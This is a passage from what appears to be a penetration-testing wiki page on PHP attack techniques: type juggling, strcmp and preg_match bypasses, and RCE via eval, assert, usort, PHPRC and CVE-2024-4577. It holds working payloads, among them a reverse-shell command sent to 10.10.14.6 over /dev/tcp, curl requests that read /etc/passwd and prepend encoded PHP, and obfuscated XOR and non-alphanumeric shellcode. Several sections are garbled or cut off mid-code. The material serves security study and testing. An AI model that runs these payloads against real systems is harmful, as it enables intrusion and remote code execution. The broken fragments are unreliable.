  \n### Loose comparisons/Type Juggling ( == )\n\nIf `==` is used in PHP, then there are unexpected cases where the comparison\
  \ doesn't behave as expected. This is because \"==\" only compare values transformed to the same type, if you also want\
  \ to compare that the type of the compared data is the same you need to use `===`.\n\nPHP comparison tables: [https://www.php.net/manual/en/types.comparisons.php](https://www.php.net/manual/en/types.comparisons.php)\n\
  \n![](<../../../images/image (567).png>)\n\n{{#file}}\nEN-PHP-loose-comparison-Type-Juggling-OWASP (1).pdf\n{{#endfile}}\n\
  \n- `\"string\" == 0 -> True` A string which doesn't start with a number is equals to a number\n- `\"0xAAAA\" == \"43690\"\
  \ -> True` Strings composed by numbers in dec or hex format can be compare to other numbers/strings with True as result\
  \ if the numbers were the same (numbers in a string are interpreted as numbers)\n- `\"0e3264578\" == 0 --> True` A string\
  \ starting with \"0e\" and followed by anything will be equals to 0\n- `\"0X3264578\" == 0X --> True` A string starting\
  \ with \"0\" and followed by any letter (X can be any letter) and followed by anything will be equals to 0\n- `\"0e12334\"\
  \ == \"0\" --> True` This is very interesting because in some cases you can control the string input of \"0\" and some content\
  \ that is being hashed and compared to it. Therefore, if you can provide a value that will create a hash starting with \"\
  0e\" and without any letter, you could bypass the comparison. You can find **already hashed strings** with this format here:\
  \ [https://github.com/spaze/hashes](https://github.com/spaze/hashes)\n- `\"X\" == 0 --> True` Any letter in a string is\
  \ equals to int 0\n\nMore info in [https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09](https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09)\n\
  \n### **in_array()**\n\n**Type Juggling** also affects to the `in_array()` function by default (you need to set to true\
  \ the third argument to make an strict comparison):\n\n```php\n$values = array(\"apple\",\"orange\",\"pear\",\"grape\");\n\
  var_dump(in_array(0, $values));\n//True\nvar_dump(in_array(0, $values, true));\n//False\n```\n\n### strcmp()/strcasecmp()\n\
  \nIf this function is used for **any authentication check** (like checking the password) and the user controls one side\
  \ of the comparison, he can send an empty array instead of a string as the value of the password (`https://example.com/login.php/?username=admin&password[]=`)\
  \ and bypass this check:\n\n```php\nif (!strcmp(\"real_pwd\",\"real_pwd\")) { echo \"Real Password\"; } else { echo \"No\
  \ Real Password\"; }\n// Real Password\nif (!strcmp(array(),\"real_pwd\")) { echo \"Real Password\"; } else { echo \"No\
  \ Real Password\"; }\n// Real Password\n```\n\nThe same error occurs with `strcasecmp()`\n\n### Strict type Juggling\n\n\
  Even if `===` is **being used** there could be errors that makes the **comparison vulnerable** to **type juggling**. For\
  \ example, if the comparison is **converting the data to a different type of object before comparing**:\n\n```php\n(int)\
  \ \"1abc\" === (int) \"1xyz\" //This will be true\n```\n\n### preg_match(/^.\\*/)\n\n**`preg_match()`** could be used to\
  \ **validate user input** (it **checks** if any **word/regex** from a **blacklist** is **present** on the **user input**\
  \ and if it's not, the code can continue it's execution).\n\n#### New line bypass\n\nHowever, when delimiting the start\
  \ of the regexp`preg_match()` **only checks the first line of the user input**, then if somehow you can **send** the input\
  \ in **several lines**, you could be able to bypass this check. Example:\n\n```php\n$myinput=\"aaaaaaa\n11111111\"; //Notice\
  \ the new line\necho preg_match(\"/1/\",$myinput);\n//1  --> In this scenario preg_match find the char \"1\"\necho preg_match(\"\
  /1.*$/\",$myinput);\n//1  --> In this scenario preg_match find the char \"1\"\necho preg_match(\"/^.*1/\",$myinput);\n//0\
  \  --> In this scenario preg_match DOESN'T find the char \"1\"\necho preg_match(\"/^.*1.*$/\",$myinput);\n//0  --> In this\
  \ scenario preg_match DOESN'T find the char \"1\"\n```\n\nTo bypass this check you could **send the value with new-lines\
  \ urlencoded** (`%0A`) or if you can send **JSON data**, send it in **several lines**:\n\n```php\n{\n  \"cmd\": \"cat /etc/passwd\"\
  \n}\n```\n\nFind an example here: [https://ramadistra.dev/fbctf-2019-rceservice](https://ramadistra.dev/fbctf-2019-rceservice)\n\
  \n#### **Length error bypass**\n\n(This bypass was tried apparently on PHP 5.2.5 and I couldn't make it work on PHP 7.3.15)\\\
  \nIf you can send to `preg_match()` a valid very **large input**, it **won't be able to process it** and you will be able\
  \ to **bypass** the check. For example, if it is blacklisting a JSON you could send:\n\n```bash\npayload = '{\"cmd\": \"\
  ls -la\", \"injected\": \"'+ \"a\"*1000001 + '\"}'\n```\n\nFrom: [https://medium.com/bugbountywriteup/solving-each-and-every-fb-ctf-challenge-part-1-4bce03e2ecb0](https://medium.com/bugbountywriteup/solving-each-and-every-fb-ctf-challenge-part-1-4bce03e2ecb0)\n\
  \n#### ReDoS Bypass\n\nTrick from: [https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223](https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223)\
  \ and [https://mizu.re/post/pong](https://mizu.re/post/pong)\n\n<figure><img src=\"../../../images/image (26).png\" alt=\"\
  \"><figcaption></figcaption></figure>\n\nIn short the problem happens because the `preg_*` functions in PHP builds upon\
  \ the [PCRE library](http://www.pcre.org/). In PCRE certain regular expressions are matched by using a lot of recursive\
  \ calls, which uses up a lot of stack space. It is possible to set a limit on the amount of recursions allowed, but in PHP\
  \ this limit [defaults to 100.000](http://php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit) which is more\
  \ than fits in the stack.\n\n[This Stackoverflow thread](http://stackoverflow.com/questions/7620910/regexp-in-preg-match-function-returning-browser-error)\
  \ was also linked in the post where it is talked more in depth about this issue. Our task was now clear:\\\n**Send an input\
  \ that would make the regex do 100_000+ recursions, causing SIGSEGV, making the `preg_match()` function return `false` thus\
  \ making the application think that our input is not malicious, throwing the surprise at the end of the payload something\
  \ like `{system(<verybadcommand>)}` to get SSTI --> RCE --> flag :)**.\n\nWell, in regex terms, we're not actually doing\
  \ 100k \"recursions\", but instead we're counting \"backtracking steps\", which as the [PHP documentation](https://www.php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit)\
  \ states it defaults to 1_000_000 (1M) in the `pcre.backtrack_limit` variable.\\\nTo reach that, `'X'*500_001` will result\
  \ in 1 million backtracking steps (500k forward and 500k backwards):\n\n```python\npayload = f\"@dimariasimone on{'X'*500_001}\
  \ {{system('id')}}\"\n```\n\n### Type Juggling for PHP obfuscation\n\n```php\n$obfs = \"1\"; //string \"1\"\n$obfs++; //int\
  \ 2\n$obfs += 0.2; //float 2.2\n$obfs = 1 + \"7 IGNORE\"; //int 8\n$obfs = \"string\" + array(\"1.1 striiing\")[0]; //float\
  \ 1.1\n$obfs = 3+2 * (TRUE + TRUE); //int 7\n$obfs .= \"\"; //string \"7\"\n$obfs += \"\"; //int 7\n```\n\n## Execute After\
  \ Redirect (EAR)\n\nIf PHP is redirecting to another page but no **`die`** or **`exit`** function is **called after the\
  \ header `Location`** is set, the PHP continues executing and appending the data to the body:\n\n```php\n<?php\n// In this\
  \ page the page will be read and the content appended to the body of\n// the redirect response\n$page = $_GET['page'];\n\
  header('Location: /index.php?page=default.html');\nreadfile($page);\n?>\n```\n\n## Path Traversal and File Inclusion Exploitation\n\
  \nCheck:\n\n\n{{#ref}}\n../../../pentesting-web/file-inclusion/\n{{#endref}}\n\n## More tricks\n\n- **register_globals**:\
  \ In **PHP < 4.1.1.1** or if misconfigured, **register_globals** may be active (or their behavior is being mimicked). This\
  \ implies that in global variables like $\\_GET if they have a value e.g. $\\_GET\\[\"param\"]=\"1234\", you can access\
  \ it via **$param. Therefore, by sending HTTP parameters you can overwrite variables** that are used within the code.\n\
  - The **PHPSESSION cookies of the same domain are stored in the same place**, therefore if within a domain **different cookies\
  \ are used in different paths** you can make that a path **accesses the cookie of the path** setting the value of the other\
  \ path cookie.\\\n  This way if **both paths access a variable with the same name** you can make the **value of that variable\
  \ in path1 apply to path2**. And then path2 will take as valid the variables of path1 (by giving the cookie the name that\
  \ corresponds to it in path2).\n- When you have the **usernames** of the users of the machine. Check the address: **/\\\
  ~\\<USERNAME>** to see if the php directories are activated.\n- If a php config has **`register_argc_argv = On`** then query\
  \ params separated by spaces are used to populate the array of arguments **`array_keys($_SERVER['argv'])`** like if they\
  \ were **arguments from the CLI**. This is interesting because if that **setting is off**, the value of the **args array\
  \ will be `Null`** when called from the web as the ars arry won't be populated. Therefore, if a web page tries to check\
  \ if it’s running as a web or as a CLI tool with a comparison like `if (empty($_SERVER['argv'])) {` an attacker could send\
  \ **parameters in the GET request like `?--configPath=/lalala`** and it will think it’s running as CLI and potential parse\
  \ and use those arguments. More info in the [original writeup](https://www.assetnote.io/resources/research/how-an-obscure-php-footgun-led-to-rce-in-craft-cms).\n\
  - [**LFI and RCE using php wrappers**](../../../pentesting-web/file-inclusion/index.html)\n\n### password_hash/password_verify\n\
  \nThis functions are typically used in PHP to **generate hashes from passwords** and to to **check** if a password is correct\
  \ compared with a hash.\\\nThe supported algorithms are: `PASSWORD_DEFAULT` and `PASSWORD_BCRYPT` (starts with `$2y$`).\
  \ Note that **PASSWORD_DEFAULT is frequently the same as PASSWORD_BCRYPT.** And currently, **PASSWORD_BCRYPT** has a **size\
  \ limitation in the input of 72bytes**. Therefore, when you try to hash something larger than 72bytes with this algorithm\
  \ only the first 72B will be used:\n\n```php\n$cont=71; echo password_verify(str_repeat(\"a\",$cont), password_hash(str_repeat(\"\
  a\",$cont).\"b\", PASSW\nFalse\n\n$cont=72; echo password_verify(str_repeat(\"a\",$cont), password_hash(str_repeat(\"a\"\
  ,$cont).\"b\", PASSW\nTrue\n```\n\n### HTTP headers bypass abusing PHP errors\n\n#### Causing error after setting headers\n\
  \nFrom [**this twitter thread**](https://twitter.com/pilvar222/status/1784618120902005070?t=xYn7KdyIvnNOlkVaGbgL6A&s=19)\
  \ you can see that sending more than 1000 GET params or 1000 POST params or 20 files, PHOP is not going to be setting headers\
  \ in the response.\n\nAllowing to bypass for example CSP headers being set in codes like:\n\n```php\n<?php\nheader(\"Content-Security-Policy:\
  \ default-src 'none';\");\nif (isset($_GET[\"xss\"])) echo $_GET[\"xss\"];\n```\n\n#### Filling a body before setting headers\n\
  \nIf a **PHP page is printing errors and echoing back some input provided by the user**, the user can make the PHP server\
  \ print back some **content long enough** so when it tries to **add the headers** into the response the server will throw\
  \ and error.\\\nIn the following scenario the **attacker made the server throw some big errors**, and as you can see in\
  \ the screen when php tried to **modify the header information, it couldn't** (so for example the CSP header wasn't sent\
  \ to the user):\n\n![](<../../../images/image (1085).png>)\n\n## SSRF in PHP functions\n\nCheck ther page:\n\n\n{{#ref}}\n\
  php-ssrf.md\n{{#endref}}\n\n## ssh2.exec stream wrapper RCE\nWhen the `ssh2` extension is installed (`ssh2.so` visible under\
  \ `/etc/php*/mods-available/`, `php -m`, or even an FTP-accessible `php8.1_conf/` directory), PHP registers `ssh2.*` wrappers\
  \ that can be abused anywhere user input is concatenated into `fopen()/file_get_contents()` targets. An admin-only download\
  \ helper such as:\n\n```php\n$wrapper = strpos($_GET['format'], '://') !== false ? $_GET['format'] : '';\n$file_content\
  \ = fopen($wrapper ? $wrapper . $file : $file, 'r');\n```\n\nis enough to execute shell commands over localhost SSH:\n\n\
  ```http\nGET /download.php?id=54&show=true&format=ssh2.exec://yuri:mustang@127.0.0.1:22/ping%2010.10.14.6%20-c%201#\n```\n\
  \n* The credential portion can reuse any leaked system password (e.g., from cracked bcrypt hashes).\n* The trailing `#`\
  \ comments out the server-side suffix (`files/<id>.zip`), so only your command runs.\n* Blind RCE is confirmed by watching\
  \ for egress with `tcpdump -ni tun0 icmp` or by serving an HTTP canary.\n\nSwap the command for a reverse shell payload\
  \ once validated:\n\n```http\nformat=ssh2.exec://yuri:mustang@127.0.0.1:22/bash%20-c%20'bash%20-i%20>&%20/dev/tcp/10.10.14.6/443%200>&1'#\n\
  ```\n\nBecause everything happens inside the PHP worker, the TCP connection originates from the target and inherits the\
  \ privileges of the injected account (`yuri`, `eric`, etc.).\n\n## Code execution\n\n**system(\"ls\");**\\\n**\\`ls\\`;**\\\
  \n**shell_exec(\"ls\");**\n\n[Check this for more useful PHP functions](php-useful-functions-disable_functions-open_basedir-bypass/index.html)\n\
  \n### **RCE via** **preg_replace()**\n\n```php\npreg_replace(pattern,replace,base)\npreg_replace(\"/a/e\",\"phpinfo()\"\
  ,\"whatever\")\n```\n\nTo execute the code in the \"replace\" argument is needed at least one match.\\\nThis option of preg_replace\
  \ has been **deprecated as of PHP 5.5.0.**\n\n### **RCE via Eval()**\n\n```\n'.system('uname -a'); $dummy='\n'.system('uname\
  \ -a');#\n'.system('uname -a');//\n'.phpinfo().'\n<?php phpinfo(); ?>\n```\n\n### **RCE via Assert()**\n\nThis function\
  \ within php allows you to **execute code that is written in a string** in order to **return true or false** (and depending\
  \ on this alter the execution). Usually the user variable will be inserted in the middle of a string. For example:\\\n`assert(\"\
  strpos($_GET['page']),'..') === false\")` --> In this case to get **RCE** you could do:\n\n```\n?page=a','NeVeR') === false\
  \ and system('ls') and strpos('a\n```\n\nYou will need to **break** the code **syntax**, **add** your **payload**, and then\
  \ **fix it again**. You can use **logic operations** such as \"**and\" or \"%26%26\" or \"|\"**. Note that \"or\", \"||\"\
  \ doesn't work because if the first condition is true our payload won't get executed. The same way \";\" doesn't work as\
  \ our payload won't be executed.\n\n**Other option** is to add to the string the execution of the command: `'.highlight_file('.passwd').'`\n\
  \n**Other option** (if you have the internal code) is to modify some variable to alter the execution: `$file = \"hola\"\
  `\n\n### **RCE via usort()**\n\nThis function is used to sort an array of items using an specific function.\\\nTo abuse\
  \ this function:\n\n```php\n<?php usort(VALUE, \"cmp\"); #Being cmp a valid function ?>\nVALUE: );phpinfo();#\n\n<?php usort();phpinfo();#,\
  \ \"cmp\"); #Being cmp a valid function ?>\n```\n\n```php\n<?php\nfunction foo($x,$y){\n    usort(VALUE, \"cmp\");\n}?>\n\
  VALUE: );}[PHP CODE];#\n\n<?php\nfunction foo($x,$y){\n    usort();}phpinfo;#, \"cmp\");\n}?>\n```\n\nYou can also use **//**\
  \ to comment the rest of the code.\n\nTo discover the number of parenthesis that you need to close:\n\n- `?order=id;}//`:\
  \ we get an error message (`Parse error: syntax error, unexpected ';'`). We are probably missing one or more brackets.\n\
  - `?order=id);}//`: we get a **warning**. That seems about right.\n- `?order=id));}//`: we get an error message (`Parse\
  \ error: syntax error, unexpected ')' i`). We probably have too many closing brackets.\n\n### **RCE via .httaccess**\n\n\
  If you can **upload** a **.htaccess**, then you can **configure** several things and even execute code (configuring that\
  \ files with extension .htaccess can be **executed**).\n\nDifferent .htaccess shells can be found [here](https://github.com/wireghoul/htshells)\n\
  \n### RCE via Env Variables\n\nIf you find a vulnerability that allows you to **modify env variables in PHP** (and another\
  \ one to upload files, although with more research maybe this can be bypassed), you could abuse this behaviour to get **RCE**.\n\
  \n- [**`LD_PRELOAD`**](../../../linux-hardening/privilege-escalation/index.html#ld_preload-and-ld_library_path): This env\
  \ variable allows you load arbitrary libraries when executing other binaries (although in this case it might not work).\n\
  - **`PHPRC`** : Instructs PHP on **where to locate its configuration file**, usually called `php.ini`. If you can upload\
  \ your own config file, then, use `PHPRC` to point PHP at it. Add an **`auto_prepend_file`** entry specifying a second uploaded\
  \ file. This second file contains normal **PHP code, which is then executed** by the PHP runtime before any other code.\n\
  \  1. Upload a PHP file containing our shellcode\n  2. Upload a second file, containing an **`auto_prepend_file`** directive\
  \ instructing the PHP preprocessor to execute the file we uploaded in step 1\n  3. Set the `PHPRC` variable to the file\
  \ we uploaded in step 2.\n     - Get more info on how to execute this chain [**from the original report**](https://labs.watchtowr.com/cve-2023-36844-and-friends-rce-in-juniper-firewalls/).\n\
  - **PHPRC** - another option\n  - If you **cannot upload files**, you could use in FreeBSD the \"file\" `/dev/fd/0` which\
  \ contains the **`stdin`**, being the **body** of the request sent to the `stdin`:\n    - `curl \"http://10.12.72.1/?PHPRC=/dev/fd/0\"\
  \ --data-binary 'auto_prepend_file=\"/etc/passwd\"'`\n  - Or to get RCE, enable **`allow_url_include`** and prepend a file\
  \ with **base64 PHP code**:\n    - `curl \"http://10.12.72.1/?PHPRC=/dev/fd/0\" --data-binary $'allow_url_include=1\\nauto_prepend_file=\"\
  data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg==\"'`\n  - Technique [**from this report**](https://vulncheck.com/blog/juniper-cve-2023-36845).\n\
  \n### XAMPP CGI RCE - CVE-2024-4577\n\nThe webserver parses HTTP requests and passes them to a PHP script executing a request\
  \ such as as [`http://host/cgi.php?foo=bar`](http://host/cgi.php?foo=bar&ref=labs.watchtowr.com) as `php.exe cgi.php foo=bar`,\
  \ which allows a parameter injection. This would allow to inject the following parameters to load the PHP code from the\
  \ body:\n\n```jsx\n-d allow_url_include=1 -d auto_prepend_file=php://input\n```\n\nMoreover, it's possible to inject the\
  \ \"-\" param using the 0xAD character due to later normalization of PHP. Check. the exploit example from [**this post**](https://labs.watchtowr.com/no-way-php-strikes-again-cve-2024-4577/):\n\
  \n```jsx\nPOST /test.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1\nHost: {{host}}\nUser-Agent:\
  \ curl/8.3.0\nAccept: */*\nContent-Length: 23\nContent-Type: application/x-www-form-urlencoded\nConnection: keep-alive\n\
  \n<?php\nphpinfo();\n?>\n\n```\n\n## PHP Sanitization bypass & Brain Fuck\n\n[**In this post**](https://blog.redteam-pentesting.de/2024/moodle-rce/)\
  \ it's possible to find great ideas to generate a brain fuck PHP code with very few chars being allowed.\\\nMoreover it's\
  \ also proposed an interesting way to execute functions that allowed them to bypass several checks:\n\n```php\n(1)->{system($_GET[chr(97)])}\n\
  ```\n\n## PHP Static analysis\n\nLook if you can insert code in calls to these functions (from [here](https://www.youtube.com/watch?v=SyWUsN0yHKI&feature=youtu.be)):\n\
  \n```php\nexec, shell_exec, system, passthru, eval, popen\nunserialize, include, file_put_cotents\n$_COOKIE | if #This mea\n\
  ```\n\nIf yo are debugging a PHP application you can globally enable error printing in`/etc/php5/apache2/php.ini` adding\
  \ `display_errors = On` and restart apache : `sudo systemctl restart apache2`\n\n### Deobfuscating PHP code\n\nYou can use\
  \ the **web**[ **www.unphp.net**](http://www.unphp.net) **to deobfuscate php code.**\n\n## PHP Wrappers & Protocols\n\n\
  PHP Wrappers ad protocols could allow you to **bypass write and read protections** in a system and compromise it. For [**more\
  \ information check this page**](../../../pentesting-web/file-inclusion/index.html#lfi-rfi-using-php-wrappers-and-protocols).\n\
  \n## Xdebug unauthenticated RCE\n\nIf you see that **Xdebug** is **enabled** in a `phpconfig()` output you should try to\
  \ get RCE via [https://github.com/nqxcode/xdebug-exploit](https://github.com/nqxcode/xdebug-exploit)\n\n## Variable variables\n\
  \n```php\n$x = 'Da';\n$$x = 'Drums';\n\necho $x; //Da\necho $$x; //Drums\necho $Da; //Drums\necho \"${Da}\"; //Drums\necho\
  \ \"$x ${$x}\"; //Da Drums\necho \"$x ${Da}\"; //Da Drums\n```\n\n## RCE abusing new $\\_GET\\[\"a\"]\\($\\_GET\\[\"b\"\
  ])\n\nIf in a page you can **create a new object of an arbitrary class** you might be able to obtain RCE, check the following\
  \ page to learn how:\n\n\n{{#ref}}\nphp-rce-abusing-object-creation-new-usd_get-a-usd_get-b.md\n{{#endref}}\n\n## Execute\

  ).(\"%04\"^\"[\").(\"%28\"^\"[\").(\"%34\"^\"[\").(\"%2e\"^\"[\").(\"%29\"^\"[\").(\"%38\"^\"[\").(\"%3e\"^\"[\"); #show_source\n\
  $__=(\"%0f\"^\"!\").(\"%2f\"^\"_\").(\"%3e\"^\"_\").(\"%2c\"^\"_\").(\"%2c\"^\"_\").(\"%28\"^\"_\").(\"%3b\"^\"_\"); #.passwd\n\
  $___=$__; #Could be not needed inside eval\n$_($___); #If ¢___ not needed then $_($__), show_source(.passwd)\n```\n\n###\
  \ XOR easy shell code\n\nAccording to [**this writeup** ](https://mgp25.com/ctf/Web-challenge/)the following it's possible\
  \ to generate an easy shellcode this way:\n\n```php\n$_=\"`{{{\"^\"?<>/\"; // $_ = '_GET';\n${$_}[_](${$_}[__]); // $_GET[_]($_GET[__]);\n\
  \n$_=\"`{{{\"^\"?<>/\";${$_}[_](${$_}[__]); // $_ = '_GET'; $_GET[_]($_GET[__]);\n```\n\nSo, if you can **execute arbitrary\
  \ PHP without numbers and letters** you can send a request like the following abusing that payload to execute arbitrary\
  \ PHP:\n\n```\nPOST: /action.php?_=system&__=cat+flag.php\nContent-Type: application/x-www-form-urlencoded\n\ncomando=$_=\"\
  `{{{\"^\"?<>/\";${$_}[_](${$_}[__]);\n```\n\nFor a more in depth explanation check [https://ctf-wiki.org/web/php/php/#preg_match](https://ctf-wiki.org/web/php/php/#preg_match)\n\
  \n### XOR Shellcode (inside eval)\n\n```bash\n#!/bin/bash\n\nif [[ -z $1 ]]; then\n  echo \"USAGE: $0 CMD\"\n  exit\nfi\n\
  \nCMD=$1\nCODE=\"\\$_='\\\n```\n\n```php\nlt;>/'^'{{{{';\\${\\$_}[_](\\${\\$_}[__]);\" `$_='\n```\n\n```php\nlt;>/'^'{{{{';\
  \ --> _GET` `${$_}[_](${$_}[__]); --> $_GET[_]($_GET[__])` `So, the function is inside $_GET[_] and the parameter is inside\
  \ $_GET[__]` http --form POST \"http://victim.com/index.php?_=system&__=$CMD\" \"input=$CODE\"\n```\n\n### Perl like\n\n\
  ```php\n<?php\n$_=[];\n$_=@\"$_\"; // $_='Array';\n$_=$_['!'=='@']; // $_=$_[0];\n$___=$_; // A\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;\n\
  $___.=$__; // S\n$___.=$__; // S\n$__=$_;\n$__++;$__++;$__++;$__++; // E\n$___.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;\
  \ // R\n$___.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;\
  \ // T\n$___.=$__;\n\n$____='_';\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;\
  \ // P\n$____.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O\n\
  $____.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;\
  \ // S\n$____.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;\
  \ // T\n$____.=$__;\n\n$_=$$____;\n$___($_[_]); // ASSERT($_POST[_]);\n```\n\n## References\n- [0xdf – HTB Era: abusing\
